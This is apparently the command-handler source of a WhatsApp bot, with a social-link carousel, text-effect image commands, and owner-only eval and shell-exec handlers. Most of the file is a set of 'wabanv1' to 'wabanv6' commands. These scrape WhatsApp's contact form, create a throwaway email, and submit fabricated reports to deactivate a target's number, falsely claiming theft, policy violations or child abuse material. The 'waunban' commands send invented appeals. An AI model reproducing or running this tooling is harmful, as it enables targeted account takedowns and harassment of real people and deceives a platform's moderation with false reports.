        'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png', // Image URL
        '', // Title
        `Follow Bot's Developer(s) On YouTube` // Body Message
        `Susbcribe Developer's YouTube Channel To Get Updates`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://www.youtube.com/@Heavstal_Tech', // Command (URL in this case)
        'cta_url', // Button type
        'https://www.youtube.com/' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1024px-Telegram_2019_Logo.svg.png', // Image URL
        '', // Title
        `Follow Bot's Developer(s) On Telegram`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://t.me/', // Command (URL in this case)
        'cta_url', // Button type
        'https://t.me/promisemdv1' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/360px-GitHub_Invertocat_Logo.svg.png', // Image URL
        '', // Title
        `Follow Bot's Developer(s) On GitHub`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://github.com/', // Command (URL in this case)
        'cta_url', // Button type
        'https://github.com/HeavstalTech' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png', // Image URL
        '', // Title
        `Follow Bot's Developer(s) On WhatsApp`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://Wa.me/', // Command (URL in this case)
        'cta_url', // Button type
        'https://whatsapp.com/channel/0029VbBcg80KwqSR7dr7do1D' // URL (used in image generation)
    ], 
];

const sendSlide = async (jid, title, message, footer, slides) => {
    const cards = slides.map(async slide => {
        const [
            image,
            titMess,
            boMessage,
            fooMess,
            textCommand,
            command,
            buttonType,
            url,
        ] = slide;
        let buttonParamsJson = {};
        switch (buttonType) {
            case "cta_url":
                buttonParamsJson = {
                    display_text: textCommand,
                    url: url,
                    merchant_url: url,
                };
                break;
            case "cta_call":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "cta_copy":
                buttonParamsJson = {
                    display_text: textCommand,
                    id: "",
                    copy_code: command,
                };
                break;
            case "cta_reminder":
            case "cta_cancel_reminder":
            case "address_message":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "send_location":
                buttonParamsJson = {};
                break;
             case "quick_reply":
             buttonParamsJson = { display_text: textCommand, id: command };
             break;
            default:
                break;
        }
        const buttonParamsJsonString = JSON.stringify(buttonParamsJson);
        return {
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: boMessage,
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: fooMess,
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: titMess,
                hasMediaAttachment: true,
                ...(await prepareWAMessageMedia(
                    { image: { url: image } },
                    { upload: HeavstalTech.waUploadToServer },
                )),
            }),
            nativeFlowMessage:
                proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [
                        {
                            name: buttonType,
                            buttonParamsJson: buttonParamsJsonString,
                        },
                    ],
                }),
        };
    });
    
    const msg = generateWAMessageFromContent(
        jid,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: message,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.fromObject({
                            text: footer,
                        }),
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            title: title,
                            subtitle: title,
                            hasMediaAttachment: false,
                        }),
                        carouselMessage:
                            proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: await Promise.all(cards),
                            }),
                    }),
                },
            },
        },
        { quoted: m},
    );
    await HeavstalTech.relayMessage(jid, msg.message, {
        messageId: msg.key.id,
    });
};
// Call the function with example parameters
sendSlide(m.chat, 'Verselor-V1', ownername, botname, slides);
}
break;
//=================================================//


//=================================================//
case 'wabanv1': {
if (!isOwner) return Vreply(mess.owner);
if (!args[0]) return Vreply(`*Incorrect Useage*\n\nUse ${prefix + command} <number]\nExample ${prefix + command} 23481xxxxxxx\n\n${footer}`)
let target_number = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let isOnWa = await HeavstalTech.onWhatsApp(target_number)
if (isOnWa.length == 0) return Vreply(`*Process Terminated*\n\nThis number is not registered on WhatsApp, enter a valid and registered WhatsApp number\n\n${footer}`)  
let WaClient = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = WaClient.headers["set-cookie"].join("; ")
let $ = cheerio.load(WaClient.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", target_number)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HeavstalTech.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break;
//=================================================//


//=================================================//
case 'wabanv2': {
if (!isOwner) return Vreply(mess.owner);
if (!args[0]) return Vreply(`*Incorrect Useage*\n\nUse ${prefix + command} <number]\nExample ${prefix + command} 23481xxxxxxx\n\n${footer}`)
let target_number = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let isOnWa = await HeavstalTech.onWhatsApp(target_number)
if (isOnWa.length == 0) return Vreply(`*Process Terminated*\n\nThis number is not registered on WhatsApp, enter a valid and registered WhatsApp number\n\n${footer}`)  
let WaClient = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = WaClient.headers["set-cookie"].join("; ")
let $ = cheerio.load(WaClient.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", target_number)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HeavstalTech.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break;
//=================================================//


//=================================================//
case 'wabanv3': {
if (!isOwner) return Vreply(mess.owner);
if (!args[0]) return Vreply(`*Incorrect Useage*\n\nUse ${prefix + command} <number]\nExample ${prefix + command} 23481xxxxxxx\n\n${footer}`)
let target_number = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let isOnWa = await HeavstalTech.onWhatsApp(target_number)
if (isOnWa.length == 0) return Vreply(`*Process Terminated*\n\nThis number is not registered on WhatsApp, enter a valid and registered WhatsApp number\n\n${footer}`)
let WaClient = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = WaClient.headers["set-cookie"].join("; ")
let $ = cheerio.load(WaClient.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", target_number)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HeavstalTech.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break;
//=================================================//


//=================================================//
case 'wabanv4': {
if (!isOwner) return Vreply(mess.owner);
if (!args[0]) return Vreply(`*Incorrect Useage*\n\nUse ${prefix + command} <number]\nExample ${prefix + command} 23481xxxxxxx\n\n${footer}`)
let target_number = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let isOnWa = await HeavstalTech.onWhatsApp(target_number)
if (isOnWa.length == 0) return Vreply(`*Process Terminated*\n\nThis number is not registered on WhatsApp, enter a valid and registered WhatsApp number\n\n${footer}`)  
let WaClient = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = WaClient.headers["set-cookie"].join("; ")
let $ = cheerio.load(WaClient.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", target_number)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HeavstalTech.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break;
//=================================================//

//=================================================//
case 'wabanv5': {
if (!isOwner) return Vreply(mess.owner);
if (!args[0]) return Vreply(`*Incorrect Useage*\n\nUse ${prefix + command} <number]\nExample ${prefix + command} 23481xxxxxxx\n\n${footer}`)
target_number = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let isOnWa = await HeavstalTech.onWhatsApp(target_number)
if (isOnWa.length == 0) return Vreply(`*Process Terminated*\n\nThis number is not registered on WhatsApp, enter a valid and registered WhatsApp number\n\n${footer}`)
let WaClient = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = WaClient.headers["set-cookie"].join("; ")
let $ = cheerio.load(WaClient.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", target_number)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HeavstalTech.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break;
//=================================================//


//=================================================//
case 'wabanv6': {
if (!isOwner) return Vreply(mess.owner);
if (!args[0]) return Vreply(`*Incorrect Useage*\n\nUse ${prefix + command} <number]\nExample ${prefix + command} 23481xxxxxxx\n\n${footer}`)
let target_number = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let isOnWa = await HeavstalTech.onWhatsApp(target_number)
if (isOnWa.length == 0) return Vreply(`*Process Terminated*\n\nThis number is not registered on WhatsApp, enter a valid and registered WhatsApp number\n\n${footer}`)  
let WaClient = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = WaClient.headers["set-cookie"].join("; ")
let $ = cheerio.load(WaClient.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", target_number)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HeavstalTech.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break;
//=================================================//


//=================================================//
case 'waunbanv1': {
if (!isOwner) return Vreply(mess.owner);
if (!args[0]) return Vreply(`*Incorrect Useage*\n\nUse ${prefix + command} <number]\nExample ${prefix + command} 23481xxxxxxx\n\n${footer}`)
let target_number = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let isOnWa = await HeavstalTech.onWhatsApp(target_number)
if (isOnWa.length == 0) return Vreply(`*Process Terminated*\n\nThis number is not registered on WhatsApp, enter a valid and registered WhatsApp number\n\n${footer}`)
let WaClient = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = WaClient.headers["set-cookie"].join("; ")
let $ = cheerio.load(WaClient.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", target_number)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HeavstalTech.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break;
//=================================================//


//=================================================//
case 'waunbanv2': {
if (!isOwner) return Vreply(mess.owner);
if (!args[0]) return Vreply(`*Incorrect Useage*\n\nUse ${prefix + command} <number]\nExample ${prefix + command} 23481xxxxxxx\n\n${footer}`)
let target_number = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let isOnWa = await HeavstalTech.onWhatsApp(target_number)
if (isOnWa.length == 0) return Vreply(`*Process Terminated*\n\nThis number is not registered on WhatsApp, enter a valid and registered WhatsApp number\n\n${footer}`)
let WaClient = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = WaClient.headers["set-cookie"].join("; ")
let $ = cheerio.load(WaClient.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", target_number)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HeavstalTech.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break;
//=================================================//


//=================================================//
case 'waunbanv3': {
if (!isOwner) return Vreply(mess.owner);
if (!args[0]) return Vreply(`*Incorrect Useage*\n\nUse ${prefix + command} <number]\nExample ${prefix + command} 23481xxxxxxx\n\n${footer}`)
let target_number = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let isOnWa = await HeavstalTech.onWhatsApp(target_number)
if (isOnWa.length == 0) return Vreply(`*Process Terminated*\n\nThis number is not registered on WhatsApp, enter a valid and registered WhatsApp number\n\n${footer}`) 
let WaClient = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = WaClient.headers["set-cookie"].join("; ")
let $ = cheerio.load(WaClient.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", target_number)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HeavstalTech.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break;
//=================================================//


//=================================================//
case 'waunbanv4': {
if (!isOwner) return Vreply(mess.owner);
if (!args[0]) return Vreply(`*Incorrect Useage*\n\nUse ${prefix + command} <number]\nExample ${prefix + command} 23481xxxxxxx\n\n${footer}`)
let target_number = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let isOnWa = await HeavstalTech.onWhatsApp(target_number)
if (isOnWa.length == 0) return Vreply(`*Process Terminated*\n\nThis number is not registered on WhatsApp, enter a valid and registered WhatsApp number\n\n${footer}`) 
let WaClient = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = WaClient.headers["set-cookie"].join("; ")
let $ = cheerio.load(WaClient.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", target_number)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HeavstalTech.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break;
//=================================================//


//=================================================//
case 'waunbanv5': {
if (!isOwner) return Vreply(mess.owner);
if (!args[0]) return Vreply(`*Incorrect Useage*\n\nUse ${prefix + command} <number]\nExample ${prefix + command} 23481xxxxxxx\n\n${footer}`)
let target_number = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let isOnWa = await HeavstalTech.onWhatsApp(target_number)
if (isOnWa.length == 0) return Vreply(`*Process Terminated*\n\nThis number is not registered on WhatsApp, enter a valid and registered WhatsApp number\n\n${footer}`)  
let WaClient = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = WaClient.headers["set-cookie"].join("; ")
let $ = cheerio.load(WaClient.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", target_number)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
HeavstalTech.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break;
//=================================================//



//=================================================//
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects': {
    if (!q) return Vreply(`Example: ${prefix + command} Heavstal Tech`);
    Vreply("Processing...");

    const styleLinks = {
        glitchtext: 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html',
        writetext: 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html',
        advancedglow: 'https://en.ephoto360.com/advanced-glow-effects-74.html',
        typographytext: 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html',
        pixelglitch: 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html',
        neonglitch: 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html',
        flagtext: 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html',
        flag3dtext: 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html',
        deletingtext: 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html',
        blackpinkstyle: 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html',
        glowingtext: 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html',
        underwatertext: 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html',
        logomaker: 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html',
        cartoonstyle: 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html',
        papercutstyle: 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html',
        watercolortext: 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html',
        effectclouds: 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html',
        blackpinklogo: 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html',
        gradienttext: 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html',
        summerbeach: 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html',
        luxurygold: 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html',
        multicoloredneon: 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html',
        sandsummer: 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html',
        galaxywallpaper: 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html',
        '1917style': 'https://en.ephoto360.com/1917-style-text-effect-523.html',
        makingneon: 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html',
        royaltext: 'https://en.ephoto360.com/royal-text-effect-online-free-471.html',
        freecreate: 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html',
        galaxystyle: 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html',
        lighteffects: 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
    };

    const link = styleLinks[command];
    if (!link) return Vreply('Invalid style link.');

    const result = await ephoto(link, q);
    await HeavstalTech.sendMessage(m.chat, {
        image: { url: result },
        caption: mess.success
    }, { quoted: m });
}
break;
//=================================================//

// ================================================================== { ALL MAIN "codes", "few declarations", "Logics", "statements" etc.} using commonjs.                  HEAVSTAL TECH SOLOS ALL                                                 ================================================================= \\

// ================================================================== { DEFAULT FUNCTION(s) }                      ========================================================== \\

default:
    // ========================================================= \\
    // 1. ASYNC EVAL (=>)
    if (budy.startsWith('=>')) {
        if (!isOwner) return; // Silent return if not owner
        try {
            const evalCode = budy.slice(2).trim();
            let evaled = await eval(`(async () => { return ${evalCode} })()`);
            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled, { depth: 2 });
            await Vreply(evaled);
        } catch (e) {
            await Vreply(String(e));
        }
    }
    
    // ========================================================= \\
    // 2. NORMAL EVAL (>)
    if (budy.startsWith('>')) {
        // Prevent conflict with "=>"
        if (budy.startsWith('=>')) return; 
        
        if (!isOwner) return; 
        try {
            const evalCode = budy.slice(1).trim();
            let evaled = await eval(evalCode);
            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled, { depth: 2 });
            await Vreply(evaled);
        } catch (e) {
            await Vreply(String(e));
        }
    }

    // ========================================================= \\
    // 3. TERMINAL EXEC ($)
    if (budy.startsWith('$')) {
        if (!isOwner) return;
        const execCode = budy.slice(1).trim();
        require("child_process").exec(execCode, (err, stdout, stderr) => {
            if (err) return Vreply(`Error:\n${err}`);
            if (stderr) return Vreply(`Stderr:\n${stderr}`);
            if (stdout) return Vreply(stdout);
        });
    }
    // ========================================================= \\
}
} catch (e) {
    const errorString = String(e);
    if (errorString.includes("conflict")) return;
    if (errorString.includes("not-authorized")) return;
    if (errorString.includes("rate-overlimit")) return;
    if (errorString.includes("Connection Closed")) return;
    if (errorString.includes("Timed Out")) return;
    HeavstalTech.sendMessage(m.chat, {text: require('util').format(e)}, { quoted: m });
    console.log(chalk.red(`[CRITICAL ERROR]: An Unexpected Error Has Occurred: ${e}`));
}
}
// ================================================================== { END OF DEFAULT FUNCTION(s) }                      ========================================================== \\
